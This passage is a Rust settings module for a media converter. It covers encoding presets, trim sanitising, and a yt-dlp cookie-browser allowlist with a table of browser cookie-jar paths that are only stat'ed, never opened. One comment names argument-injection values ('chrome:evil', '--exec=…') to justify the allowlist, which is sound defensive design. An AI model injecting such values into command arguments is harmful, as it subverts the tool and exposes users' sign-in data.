//! User settings.
//!
//! Design rule for this app: **the defaults must be right for 95% of people**, so
//! [`Settings::default()`] is the "Web & Demo" preset - safe, small, plays everywhere. The advanced
//! panel in the UI is just a direct editor for this struct; nothing else in the pipeline changes.

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::time::SystemTime;

/// Read a value a *future* version of this app may have written, falling back to this version's
/// default when it is not one we understand.
///
/// Unknown *fields* are already ignored by serde, but an unknown enum *variant* - `"codec":
/// "h266"` from a newer build, a hand edit, a preset we later renamed - failed the whole document.
/// And a settings file that does not parse is a settings file the app silently replaces with the
/// defaults on the next save: every preference the user ever set, gone, because of one word. One
/// unreadable value is worth exactly one default and nothing more.
fn lenient<'de, D, T>(deserializer: D) -> Result<T, D::Error>
where
    D: serde::Deserializer<'de>,
    T: serde::de::DeserializeOwned + Default,
{
    let raw = serde_json::Value::deserialize(deserializer)?;
    Ok(T::deserialize(&raw).unwrap_or_default())
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum Preset {
    /// H.264 1080p / MP3 192k / JPEG 2560px - plays everywhere, small enough to email.
    #[default]
    WebAndDemo,
    /// Aggressive size reduction for chat apps and slow uploads.
    Smallest,
    /// Visually lossless, keeps original resolution.
    HighQuality,
    /// Lossless codecs, no resizing, metadata preserved.
    Archive,
}

impl Preset {
    pub const ALL: [Preset; 4] =
        [Preset::WebAndDemo, Preset::Smallest, Preset::HighQuality, Preset::Archive];

    pub const fn id(self) -> &'static str {
        match self {
            Preset::WebAndDemo => "web_and_demo",
            Preset::Smallest => "smallest",
            Preset::HighQuality => "high_quality",
            Preset::Archive => "archive",
        }
    }

    pub const fn label(self) -> &'static str {
        match self {
            Preset::WebAndDemo => "Web & Demo",
            Preset::Smallest => "Smallest file",
            Preset::HighQuality => "High quality",
            Preset::Archive => "Lossless / archive",
        }
    }

    pub const fn description(self) -> &'static str {
        match self {
            Preset::WebAndDemo => "1080p H.264 · MP3 192k · JPEG 2560px. Plays everywhere.",
            Preset::Smallest => "720p H.265 · Opus 96k · JPEG 1600px. Built for slow uploads.",
            Preset::HighQuality => "Original size, visually lossless. Bigger files.",
            Preset::Archive => "FLAC / PNG / ProRes. No resizing, keeps metadata.",
        }
    }

    /// The whole settings object this preset stands for.
    ///
    /// Deliberately *not* trim-aware: a preset describes quality, and [`TrimSettings::default`] is
    /// "no trim", so `Preset::Smallest.settings()` is a fresh object with trimming off. The shell
    /// is what carries a trim the user set up across a preset click (see
    /// `commands::apply_preset`), because the shell is the only layer that knows what the current
    /// settings are - and a preset that silently un-trimmed a batch on its way past would be the
    /// picker throwing away a choice it has no opinion about.
    ///
    /// [`LinkSettings`] is carried across on exactly the same terms, and it matters more: a preset
    /// click that quietly forgot which browser to borrow the sign-in from would turn the next
    /// members-only link back into a failure the user had already fixed.
    pub fn settings(self) -> Settings {
        let mut s = Settings::default();
        match self {
            Preset::WebAndDemo => {}
            Preset::Smallest => {
                s.video.codec = VideoCodec::H265;
                s.video.quality = QualityLevel::Small;
                s.video.max_height = Some(720);
                s.video.fps_cap = Some(30.0);
                s.audio.codec = AudioCodec::Opus;
                s.audio.bitrate_kbps = 96;
                s.image.quality = 72;
                s.image.max_dimension = Some(1600);
                s.gif.width = 400;
                s.gif.fps = 10.0;
            }
            Preset::HighQuality => {
                s.video.quality = QualityLevel::High;
                s.video.max_height = None;
                s.video.fps_cap = None;
                s.audio.bitrate_kbps = 256;
                s.image.quality = 95;
                s.image.max_dimension = None;
                s.image.strip_metadata = false;
                s.gif.width = 720;
                s.gif.fps = 20.0;
            }
            Preset::Archive => {
                s.video.codec = VideoCodec::ProRes;
                s.video.quality = QualityLevel::Max;
                s.video.max_height = None;
                s.video.fps_cap = None;
                s.audio.codec = AudioCodec::Flac;
                s.image.quality = 100;
                s.image.max_dimension = None;
                // "Keeps metadata" is the promise this preset makes in the picker, and video is
                // where it matters most: capture date, camera and GPS live in the container.
                s.video.strip_metadata = false;
                s.image.strip_metadata = false;
                s.document.raster_dpi = 300;
            }
        }
        s.preset = self;
        s
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum QualityLevel {
    Small,
    #[default]
    Balanced,
    High,
    Max,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum VideoCodec {
    /// Pick the natural codec for the chosen container (recommended).
    #[default]
    Auto,
    H264,
    H265,
    Vp9,
    Av1,
    ProRes,
    /// Remux only - no re-encode, instant, but only when the container accepts the stream.
    Copy,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum AudioCodec {
    /// Pick the natural codec for the chosen container (recommended).
    #[default]
    Auto,
    Mp3,
    Aac,
    Opus,
    Vorbis,
    Flac,
    Alac,
    PcmWav,
    Copy,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum HardwareAccel {
    /// Use Apple VideoToolbox when the codec supports it (fast, slightly larger files).
    #[default]
    Auto,
    Off,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct VideoSettings {
    #[serde(deserialize_with = "lenient")]
    pub codec: VideoCodec,
    #[serde(deserialize_with = "lenient")]
    pub quality: QualityLevel,
    /// Downscale so height <= this value. Never upscales. `None` keeps the source size.
    pub max_height: Option<u32>,
    pub fps_cap: Option<f32>,
    /// Explicit bitrate in kbps. Overrides `quality` when set.
    pub bitrate_kbps: Option<u32>,
    /// `+faststart` so browsers can start playing before the file finished downloading.
    pub faststart: bool,
    pub strip_metadata: bool,
    #[serde(deserialize_with = "lenient")]
    pub hardware_accel: HardwareAccel,
}

impl Default for VideoSettings {
    fn default() -> Self {
        Self {
            codec: VideoCodec::Auto,
            quality: QualityLevel::Balanced,
            max_height: Some(1080),
            fps_cap: Some(60.0),
            bitrate_kbps: None,
            faststart: true,
            strip_metadata: true,
            hardware_accel: HardwareAccel::Auto,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct AudioSettings {
    #[serde(deserialize_with = "lenient")]
    pub codec: AudioCodec,
    pub bitrate_kbps: u32,
    /// `None` keeps the source sample rate.
    pub sample_rate: Option<u32>,
    /// `None` keeps the source channel layout.
    pub channels: Option<u8>,
    /// EBU R128 loudness normalisation (-16 LUFS, good for podcasts / screen recordings).
    pub normalize_loudness: bool,
}

impl Default for AudioSettings {
    fn default() -> Self {
        Self {
            codec: AudioCodec::Auto,
            bitrate_kbps: 192,
            sample_rate: None,
            channels: None,
            normalize_loudness: false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct ImageSettings {
    /// 1-100, maps to the encoder's own scale.
    pub quality: u8,
    /// Downscale so the long edge <= this value. Never upscales.
    pub max_dimension: Option<u32>,
    pub strip_metadata: bool,
    /// Colour used when flattening transparency into a format without alpha (JPEG).
    pub flatten_background: String,
    /// Use lossless mode where the format supports it (WebP / AVIF).
    pub lossless: bool,
    /// When a video/animation is converted to a still format, sample this many frames per second.
    pub frame_extract_fps: f32,
}

impl Default for ImageSettings {
    fn default() -> Self {
        Self {
            quality: 85,
            max_dimension: Some(2560),
            strip_metadata: true,
            flatten_background: "#ffffff".into(),
            lossless: false,
            frame_extract_fps: 1.0,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct GifSettings {
    pub fps: f32,
    pub width: u32,
    /// Per-clip optimised palette + Bayer dithering (much better than the default 216 colours).
    pub optimize_palette: bool,
    /// 0 = loop forever.
    pub loop_count: u32,
}

impl Default for GifSettings {
    fn default() -> Self {
        Self { fps: 12.0, width: 480, optimize_palette: true, loop_count: 0 }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct DocumentSettings {
    /// DPI used when rasterising PDF/vector pages to images.
    pub raster_dpi: u32,
    /// Only rasterise the first page (contact-sheet style previews).
    pub first_page_only: bool,
}

impl Default for DocumentSettings {
    fn default() -> Self {
        Self { raster_dpi: 150, first_page_only: false }
    }
}

/// The longest start point and the longest length a trim may name: 24 hours.
///
/// Not a policy about art, just the end of the range where these numbers are still a *duration*.
/// `1e308` seconds and `NaN` both arrive from a text field, and `-ss 100000000000` is a command
/// line that either fails oddly or produces an empty file.
pub const MAX_TRIM_SECS: f64 = 24.0 * 60.0 * 60.0;

/// Cut every audio/video file in the batch down to the same slice.
///
/// One start point and one length for the whole batch, because that is the feature: "cut this lot
/// to the first 10 seconds" is one gesture, and a per-file timeline would be a video editor. A
/// source shorter than `length_secs` simply keeps its own length - FFmpeg stops when the input
/// ends, so nothing has to be padded, refused or even mentioned.
///
/// Off by default, always: a converter that quietly shortened people's files would be worse than
/// useless.
#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct TrimSettings {
    pub enabled: bool,
    /// Seconds into the source where the kept slice starts.
    pub start_secs: f64,
    /// Seconds to keep from `start_secs` on.
    pub length_secs: f64,
}

impl Default for TrimSettings {
    fn default() -> Self {
        Self { enabled: false, start_secs: 0.0, length_secs: 10.0 }
    }
}

impl TrimSettings {
    /// The `(start, length)` pair to act on, or `None` when this trim asks for nothing.
    ///
    /// The single place the numbers are sanitised. Settings arrive over IPC from a text field, so
    /// they can be `NaN`, negative or astronomical; clamping here once means the command line, the
    /// progress bar and the "starts past the end" refusal can never disagree about what "10 seconds
    /// from 30" means - which is the failure mode where a bar sits at 2% while a correctly trimmed
    /// clip encodes.
    pub fn effective(&self) -> Option<(f64, f64)> {
        if !self.enabled {
            return None;
        }
        let start = sane_secs(self.start_secs);
        let length = sane_secs(self.length_secs);
        // A length of zero (or one that was not a number at all) is not a trim to obey: it is a
        // field the user has not finished typing. `check_trim` in the shell is what says so.
        (length > 0.0).then_some((start, length))
    }

    /// How long the *output* will be, given how long the source is.
    ///
    /// `min(length, max(0, duration - start))`, i.e. the trimmed slice, or the tail of the source
    /// when the trim asks for more than there is. This is the number the progress bar and the ETA
    /// have to be about: measuring a 10 second cut against a 10 minute film leaves the bar at 2%
    /// for the whole job.
    ///
    /// `None` in, `None` out: an unknown duration stays unknown rather than becoming `length_secs`.
    /// A 6 second clip cut to 10 would then show a bar that stops at 60%, and this app does not
    /// guess at progress.
    pub fn expected_output_secs(&self, source_secs: Option<f64>) -> Option<f64> {
        let source = source_secs?;
        let Some((start, length)) = self.effective() else { return Some(source) };
        Some(length.min((source - start).max(0.0)))
    }

    /// Would this trim start at or after the end of a source that long? Then it can only produce an
    /// empty file, which looks exactly like a successful conversion.
    pub fn starts_past_the_end(&self, source_secs: f64) -> bool {
        match self.effective() {
            Some((start, _)) => source_secs > 0.0 && start >= source_secs,
            None => false,
        }
    }
}

fn sane_secs(v: f64) -> f64 {
    if v.is_finite() {
        v.clamp(0.0, MAX_TRIM_SECS)
    } else {
        0.0
    }
}

// ---------------------------------------------------------------------------------------------
// Links: the one setting that is about a credential
// ---------------------------------------------------------------------------------------------

/// Every browser yt-dlp will take cookies from, spelled the way `--cookies-from-browser` spells
/// them.
///
/// A hardcoded allowlist rather than a free text field, and the argument vector is the reason. This
/// name crosses IPC from a webview and lands next to `--cookies-from-browser`, where `chrome:evil`
/// would silently select somebody else's profile and `--exec=…` would not be a browser name at all.
/// So only a string that *matched* one of these is ever acted on, and what reaches argv is this
/// `&'static str` rather than the one that arrived - see [`LinkSettings::effective`].
///
/// The spellings are yt-dlp's own, read out of `--cookies-from-browser`'s help text on 2026.08.19:
/// "brave, chrome, chromium, edge, firefox, opera, safari, vivaldi, whale". `whale` is left out
/// because nothing offers it in the picker; adding it is one word here.
pub const COOKIE_BROWSERS: &[&str] =
    &["safari", "chrome", "chromium", "edge", "brave", "firefox", "vivaldi", "opera"];

/// Where one browser keeps the cookie jar yt-dlp would read, relative to the user's home.
///
/// Only ever `stat`ed. Nothing in this crate opens one of these files, and the only thing anybody
/// is told about one is how big it is and when it was last written - which is the difference
/// between "your sign-in probably lives here" and reading somebody's cookies to find out.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CookieJar {
    /// Fixed candidates under `$HOME`, in the order they were introduced. Chrome moved its jar
    /// from `Default/Cookies` to `Default/Network/Cookies` and older profiles still have the first
    /// one, so both are looked at and the one that was written last wins.
    Home(&'static [&'static str]),
    /// One `cookies.sqlite` per profile directory (Firefox, which numbers and names them
    /// arbitrarily). The most recently written profile is the one the user is signed in to.
    Profiles { dir: &'static str, file: &'static str },
}

/// Each allowlisted browser as a person sees it, as LaunchServices names it, and as the disk has
/// it: the name to *say*, the application bundle to *look for*, the bundle identifier macOS
/// records when it is the default browser, and where its cookie jar lives.
///
/// It lives here, immediately under [`COOKIE_BROWSERS`], because these must never drift: a
/// browser on the allowlist with no bundle name would be permanently reported as "not installed"
/// and quietly disappear from a recovery flow that only offers what exists, and a bundle name for a
/// browser that is not on the allowlist would offer a sign-in that can never become a flag.
/// `every_allowlisted_browser_has_a_bundle_name` is what pins that both ways.
///
/// The bundle names are the ones the installers really write, which is not always the browser's
/// own name: Chrome ships as `Google Chrome.app` and Brave as `Brave Browser.app`. The label is the
/// short form a sentence uses ("Use your Chrome sign-in"), never the bundle.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct BrowserApp {
    /// yt-dlp's spelling, and the [`COOKIE_BROWSERS`] entry this row is about.
    pub id: &'static str,
    /// What a sentence calls it.
    pub label: &'static str,
    /// The application bundle, as its installer writes it.
    pub bundle: &'static str,
    /// The bundle identifier, compared case-insensitively: LaunchServices writes
    /// `com.google.chrome` where the app's own `Info.plist` says `com.google.Chrome`.
    pub bundle_id: &'static str,
    /// Where its cookie jar is, relative to `$HOME`.
    pub jar: CookieJar,
}

/// The table itself. Measured on macOS 26.6.2 against the paths yt-dlp's own
/// `--cookies-from-browser` reads.
pub const COOKIE_BROWSER_APPS: &[BrowserApp] = &[
    BrowserApp {
        id: "safari",
        label: "Safari",
        bundle: "Safari.app",
        bundle_id: "com.apple.Safari",
        // The one jar macOS keeps behind Full Disk Access. `stat` answers for it without the
        // permission; opening it does not (see `link::SafariCookieAccess`).
        jar: CookieJar::Home(&[
            "Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies",
            // Where it lived before Safari was sandboxed. Still present on upgraded Macs.
            "Library/Cookies/Cookies.binarycookies",
        ]),
    },
    BrowserApp {
        id: "chrome",
        label: "Chrome",
        bundle: "Google Chrome.app",
        bundle_id: "com.google.Chrome",
        jar: CookieJar::Home(&[
            "Library/Application Support/Google/Chrome/Default/Cookies",
            "Library/Application Support/Google/Chrome/Default/Network/Cookies",
        ]),
    },
    BrowserApp {
        id: "chromium",
        label: "Chromium",
        bundle: "Chromium.app",
        bundle_id: "org.chromium.Chromium",
        jar: CookieJar::Home(&[
            "Library/Application Support/Chromium/Default/Cookies",
            "Library/Application Support/Chromium/Default/Network/Cookies",
        ]),
    },
    BrowserApp {
        id: "edge",
        label: "Edge",
        bundle: "Microsoft Edge.app",
        bundle_id: "com.microsoft.edgemac",
        jar: CookieJar::Home(&[
            "Library/Application Support/Microsoft Edge/Default/Cookies",
            "Library/Application Support/Microsoft Edge/Default/Network/Cookies",
        ]),
    },
    BrowserApp {
        id: "brave",
        label: "Brave",
        bundle: "Brave Browser.app",
        bundle_id: "com.brave.Browser",
        jar: CookieJar::Home(&[
            "Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies",
            "Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies",
        ]),
    },
    BrowserApp {
        id: "firefox",
        label: "Firefox",
        bundle: "Firefox.app",
        bundle_id: "org.mozilla.firefox",
        jar: CookieJar::Profiles {
            dir: "Library/Application Support/Firefox/Profiles",
            file: "cookies.sqlite",
        },
    },
    BrowserApp {
        id: "vivaldi",
        label: "Vivaldi",
        bundle: "Vivaldi.app",
        bundle_id: "com.vivaldi.Vivaldi",
        jar: CookieJar::Home(&[
            "Library/Application Support/Vivaldi/Default/Cookies",
            "Library/Application Support/Vivaldi/Default/Network/Cookies",
        ]),
    },
    BrowserApp {
        id: "opera",
        label: "Opera",
        bundle: "Opera.app",
        bundle_id: "com.operasoftware.Opera",
        jar: CookieJar::Home(&[
            "Library/Application Support/com.operasoftware.Opera/Cookies",
            "Library/Application Support/com.operasoftware.Opera/Network/Cookies",
        ]),
    },
];

/// The allowlisted spelling of a browser name, or `None` for anything that is not on the list.
///
/// Case-insensitive: this file can be hand-edited, and a dropdown whose labels read "Chrome" and
/// "Safari" is a perfectly reasonable thing for a UI to send verbatim.
pub fn cookie_browser(name: &str) -> Option<&'static str> {
    let name = name.trim();
    COOKIE_BROWSERS.iter().copied().find(|b| b.eq_ignore_ascii_case(name))
}

/// Everything the table knows about an allowlisted browser, or `None` for anything else.
pub fn cookie_browser_app(name: &str) -> Option<&'static BrowserApp> {
    let name = cookie_browser(name)?;
    COOKIE_BROWSER_APPS.iter().find(|app| app.id == name)
}

/// Which allowlisted browser macOS would open an `https://` link with.
///
/// The LaunchServices rule, and the half of it that was got wrong before: **an absent handler is
/// itself the answer**. macOS records a URL scheme handler in
/// `~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist` only when
/// the user *changes* the default; a Mac whose owner never changed it has no `https` entry at all,
/// and its default browser is Safari. Reading "we cannot know" out of that absence is what told a
/// Safari user to borrow a Chrome sign-in they had never made.
///
/// `handler` is the bundle identifier recorded for `https` (or `http`), if there is one - the
/// shell reads the plist, this decides what it means:
///
/// * `None` - nothing recorded, so Safari, which is what macOS ships as the default;
/// * `Some(id)` matching the table - that browser;
/// * `Some(id)` we do not support (Arc, Orion, a mail client someone registered) - `None`, because
///   the honest answer is "your default is not a browser we can borrow from", not a guess.
pub fn default_browser_from_handler(handler: Option<&str>) -> Option<&'static str> {
    let Some(bundle_id) = handler.map(str::trim).filter(|id| !id.is_empty()) else {
        return Some("safari");
    };
    COOKIE_BROWSER_APPS
        .iter()
        .find(|app| app.bundle_id.eq_ignore_ascii_case(bundle_id))
        .map(|app| app.id)
}

/// The size at or below which a cookie store is one nothing has really been written to.
///
/// Chrome and every Chromium relative create their jar as an empty SQLite database the first time
/// they launch, and it is exactly 65,536 bytes - measured on the Mac this change comes from, where
/// Chrome had been opened once, its jar had sat untouched for two days at precisely that size, and
/// the app cheerfully offered to borrow the sign-in inside it. There is none: 64 KB is the schema.
///
/// It is a floor, not a verdict. A jar above it is *evidence* of use, nothing more, and no cookie
/// is read to check.
pub const EMPTY_COOKIE_STORE_BYTES: u64 = 64 * 1024;

/// A cookie store written within this many days is as good a sign-in as any other written within
/// it: the freshness comparison is deliberately coarse so that a browser the user opened this
/// morning does not beat their actual default browser by four hours.
pub const FRESH_COOKIE_STORE_DAYS: u64 = 7;

/// Past this many days a cookie store is stale enough to rank below anything newer, whoever it
/// belongs to. (Sessions do expire, and a jar nobody has touched in a month usually has too.)
pub const RECENT_COOKIE_STORE_DAYS: u64 = 30;

/// What a `stat` says about a file. Deliberately the whole of it: size and modification time are
/// everything this module is allowed to know about a cookie store.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct FileFacts {
    pub bytes: u64,
    pub modified: Option<SystemTime>,
}

/// The three questions this module asks the filesystem, injected so the whole table can be tested
/// against a Mac that does not exist.
///
/// **None of them opens a file.** `stat` and a directory listing are the entire vocabulary, which
/// is what makes "we never read your cookies" a property of the interface rather than a promise in
/// a comment.
pub trait DiskFacts {
    /// Is there something at this path? (An application bundle is a directory, so this is not the
    /// executable probe helper discovery uses.)
    fn exists(&self, path: &Path) -> bool;
    /// Size and modification time, or `None` when there is no file there.
    fn stat(&self, path: &Path) -> Option<FileFacts>;
    /// The entries of a directory, for Firefox's one-jar-per-profile layout. Names only.
    fn dir_entries(&self, dir: &Path) -> Vec<PathBuf>;
}

/// The real disk, `stat` only.
#[derive(Debug, Clone, Copy, Default)]
pub struct RealDisk;

impl DiskFacts for RealDisk {
    fn exists(&self, path: &Path) -> bool {
        path.exists()
    }

    fn stat(&self, path: &Path) -> Option<FileFacts> {
        let meta = std::fs::metadata(path).ok()?;
        meta.is_file().then(|| FileFacts { bytes: meta.len(), modified: meta.modified().ok() })
    }

    fn dir_entries(&self, dir: &Path) -> Vec<PathBuf> {
        let Ok(entries) = std::fs::read_dir(dir) else { return Vec::new() };
        entries.flatten().map(|e| e.path()).collect()
    }
}

/// One allowlisted browser, and everything this machine can be asked about it without opening a
/// cookie.
///
/// The reason this exists at all: a menu of eight browsers is seven dead options on a Mac with one
/// installed, and a recovery flow that offers a sign-in the user cannot give is the dead end this
/// whole change is about. The reason it grew: "any browser that is not Safari" was the rule, on the
/// grounds that Safari's jar costs a permission - and it offered a Chrome that had been opened once
/// to a user whose YouTube session was in Safari. Convenience is not evidence. Size and
/// modification time are.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct BrowserPresence {
    /// yt-dlp's own spelling, and exactly the string `LinkSettings::cookie_browser` takes.
    pub id: &'static str,
    /// The name to put in a sentence: "Chrome", never "Google Chrome.app".
    pub label: &'static str,
    /// True when the application bundle is on this machine.
    pub installed: bool,
    /// Where it was found, for a diagnostic. `None` when it is not installed.
    pub app_path: Option<PathBuf>,
    /// True when macOS would open an `https://` link with this browser
    /// ([`default_browser_from_handler`]). At most one row is the default, and on a Mac whose
    /// owner never changed it that row is Safari.
    pub is_default: bool,
    /// The cookie store found on disk, for a diagnostic. `None` when there is none - which is a
    /// browser that has never been signed in to anything.
    pub cookie_store: Option<PathBuf>,
    /// True when that file is there. The one fact that decides whether borrowing this browser's
    /// sign-in can work at all.
    pub cookie_store_exists: bool,
    /// Its size in bytes, from `stat`. An empty Chromium jar is
    /// [`EMPTY_COOKIE_STORE_BYTES`]; nothing inside it is read to find out what that means.
    pub cookie_store_bytes: Option<u64>,
    /// When it was last written, in whole seconds since the Unix epoch. The strongest single
    /// signal of where a live sign-in is.
    pub cookie_store_modified: Option<u64>,
    /// True for Safari alone: macOS keeps its jar behind Full Disk Access, so reading it needs a
    /// permission no other browser does. A cost to mention - never a reason to rank it lower.
    pub needs_full_disk_access: bool,
    /// Where this browser comes in the one ranking ([`rank_browsers`]), 1 being the browser the
    /// user's sign-in most likely lives in. Every row has one, so the list can stay in allowlist
    /// order and still be sorted by the caller.
    pub rank: usize,
    /// True for `rank == 1`, and only when that row is worth offering (installed, with a cookie
    /// store that exists). False on every row when there is nothing honest to offer.
    pub recommended: bool,
}

/// Every allowlisted browser, in allowlist order, with everything this machine says about it.
///
/// `disk` is injected so the table can be tested against a Mac that does not exist, and its three
/// methods are the whole vocabulary: `stat`, `stat`, and a directory listing. No cookie store is
/// opened here, by this function or by anything it calls.
///
/// `default_browser` is the answer to [`default_browser_from_handler`] - the shell reads
/// LaunchServices, this only marks the row. `now` is passed rather than read so that "written
/// three days ago" is a fact a test can state.
///
/// The order of the rows never changes (a filtered or re-sorted list would make "you have Chrome"
/// and "you have nothing we can borrow from" look like the same answer); the *ranking* is carried
/// per row instead. See [`rank_browsers`] for the rule.
pub fn cookie_browser_presence(
    disk: &dyn DiskFacts,
    default_browser: Option<&str>,
    now: SystemTime,
) -> Vec<BrowserPresence> {
    let default_browser = default_browser.and_then(cookie_browser);
    let mut rows: Vec<BrowserPresence> = COOKIE_BROWSER_APPS
        .iter()
        .map(|app| {
            #[cfg(not(windows))]
            let app_path =
                crate::tools::application_bundles(app.bundle).into_iter().find(|p| disk.exists(p));
            #[cfg(not(windows))]
            let store = cookie_store(disk, &app.jar);
            #[cfg(windows)]
            let (app_path, store) = windows_browser(disk, app.id);
            let facts = store.as_ref().map(|(_, facts)| *facts);
            BrowserPresence {
                id: app.id,
                label: app.label,
                installed: app_path.is_some(),
                app_path,
                is_default: default_browser == Some(app.id),
                cookie_store: store.map(|(path, _)| path),
                cookie_store_exists: facts.is_some(),
                cookie_store_bytes: facts.map(|f| f.bytes),
                cookie_store_modified: facts.and_then(|f| f.modified).map(unix_secs),
                needs_full_disk_access: !cfg!(windows) && app.id == "safari",
                // Filled in below, once every row is known: a rank is a statement about the list.
                rank: 0,
                recommended: false,
            }
        })
        .collect();
    rank_browsers(&mut rows, now);
    rows
}

/// The cookie store one browser has on this Mac, and what `stat` says about it.
///
/// More than one candidate can exist (Chrome's old and new locations, Firefox's profiles), and the
/// one that was written last is the one the user is signed in with - so that is the one reported.
#[cfg_attr(windows, allow(dead_code))]
fn cookie_store(disk: &dyn DiskFacts, jar: &CookieJar) -> Option<(PathBuf, FileFacts)> {
    let home = crate::tools::home_dir()?;
    let candidates: Vec<PathBuf> = match jar {
        CookieJar::Home(paths) => paths.iter().map(|p| home.join(p)).collect(),
        CookieJar::Profiles { dir, file } => {
            let mut profiles = disk.dir_entries(&home.join(dir));
            // A stable order before the newest-wins comparison below, so two profiles written in
            // the same second do not report a different one on every call.
            profiles.sort();
            profiles.into_iter().map(|p| p.join(file)).collect()
        }
    };
    candidates
        .into_iter()
        .filter_map(|path| disk.stat(&path).map(|facts| (path, facts)))
        .max_by_key(|(_, facts)| (facts.modified.map(unix_secs).unwrap_or(0), facts.bytes))
}

#[cfg(windows)]
fn windows_browser(
    disk: &dyn DiskFacts,
    id: &str,
) -> (Option<PathBuf>, Option<(PathBuf, FileFacts)>) {
    let (exe, profile) = match id {
        "chrome" => ("Google/Chrome/Application/chrome.exe", "Google/Chrome/User Data"),
        "chromium" => ("Chromium/Application/chrome.exe", "Chromium/User Data"),
        "edge" => ("Microsoft/Edge/Application/msedge.exe", "Microsoft/Edge/User Data"),
        "brave" => (
            "BraveSoftware/Brave-Browser/Application/brave.exe",
            "BraveSoftware/Brave-Browser/User Data",
        ),
        "firefox" => ("Mozilla Firefox/firefox.exe", "Mozilla/Firefox/Profiles"),
        "vivaldi" => ("Vivaldi/Application/vivaldi.exe", "Vivaldi/User Data"),
        "opera" => ("Programs/Opera/launcher.exe", "Opera Software/Opera Stable"),
        _ => return (None, None),
    };
    let app = ["ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"]
        .iter()
        .filter_map(std::env::var_os)
        .map(|root| PathBuf::from(root).join(exe))
        .find(|path| disk.exists(path));
    let root = std::env::var_os(if matches!(id, "firefox" | "opera") {
        "APPDATA"
    } else {
        "LOCALAPPDATA"
    });
    let Some(root) = root else { return (app, None) };
    let profile = PathBuf::from(root).join(profile);
    let mut profiles = disk.dir_entries(&profile);
    profiles.sort();
    let candidates = if id == "firefox" {
        profiles.into_iter().map(|path| path.join("cookies.sqlite")).collect::<Vec<_>>()
    } else {
        profiles.push(profile.clone());
        profiles.push(profile.join("Default"));
        profiles
            .into_iter()
            .flat_map(|path| [path.join("Cookies"), path.join("Network/Cookies")])
            .collect()
    };
    let store = candidates
        .into_iter()
        .filter_map(|path| disk.stat(&path).map(|facts| (path, facts)))
        .max_by_key(|(_, facts)| (facts.modified.map(unix_secs).unwrap_or(0), facts.bytes));
    (app, store)
}

/// Whole seconds since the Unix epoch, and `0` for the handful of filesystems that report a time
/// before it.
fn unix_secs(time: SystemTime) -> u64 {
    time.duration_since(SystemTime::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

/// Order the browsers by where the user's sign-in most likely *is*, and number every row.
///
/// One rule, in one place, out of facts the app can have without opening anything:
///
/// 1. **usable** - installed, with a cookie store that exists. Everything else can only fail;
/// 2. **not empty** - a store larger than [`EMPTY_COOKIE_STORE_BYTES`]. A browser opened once has a
///    64 KB SQLite file with a schema in it and no sign-in, and offering that is how this bug
///    happened;
/// 3. **freshness**, in bands rather than seconds: written within [`FRESH_COOKIE_STORE_DAYS`],
///    within [`RECENT_COOKIE_STORE_DAYS`], or longer ago (which is where a store of unknown age
///    also lands);
/// 4. **the default browser**, as the tie-break between two stores that are equally good evidence -
///    which is what it is worth, and no more;
/// 5. newest first, then allowlist order, so the answer is the same on every call.
///
/// What is deliberately *not* in the rule: whether reading the store costs a permission. Ranking
/// Safari below an unused Chrome because Chrome needs no Full Disk Access is precisely the
/// convenience-over-evidence heuristic that failed a real user; `needs_full_disk_access` is
/// reported as a fact for the sentence, not folded into the order.
pub fn rank_browsers(rows: &mut [BrowserPresence], now: SystemTime) {
    let mut order: Vec<usize> = (0..rows.len()).collect();
    order.sort_by_key(|&i| {
        let row = &rows[i];
        let usable = row.installed && row.cookie_store_exists;
        let used = row.cookie_store_bytes.is_some_and(|b| b > EMPTY_COOKIE_STORE_BYTES);
        (
            !usable,
            !used,
            freshness_band(row.cookie_store_modified, now),
            !row.is_default,
            std::cmp::Reverse(row.cookie_store_modified.unwrap_or(0)),
            i,
        )
    });
    for (place, &i) in order.iter().enumerate() {
        rows[i].rank = place + 1;
    }
    if let Some(&best) = order.first() {
        let row = &mut rows[best];
        row.recommended = row.installed && row.cookie_store_exists;
    }
}

/// Which freshness band a cookie store falls in: 0 this week, 1 this month, 2 longer ago or never
/// measured. Lower is better, and an unknown time is treated as old rather than as new.
fn freshness_band(modified: Option<u64>, now: SystemTime) -> u8 {
    let Some(modified) = modified else { return 2 };
    let days = unix_secs(now).saturating_sub(modified) / 86_400;
    if days <= FRESH_COOKIE_STORE_DAYS {
        0
    } else if days <= RECENT_COOKIE_STORE_DAYS {
        1
    } else {
        2
    }
}

/// Where Safari's cookie jar is on this Mac - the path, not permission to read it.
///
/// The one candidate that `stat` finds, or the current location when there is nothing there at all
/// (so that the caller's `open` can answer "no such file" for itself rather than being told it
/// here). `stat` succeeds on that path without Full Disk Access; `open` does not, which is the
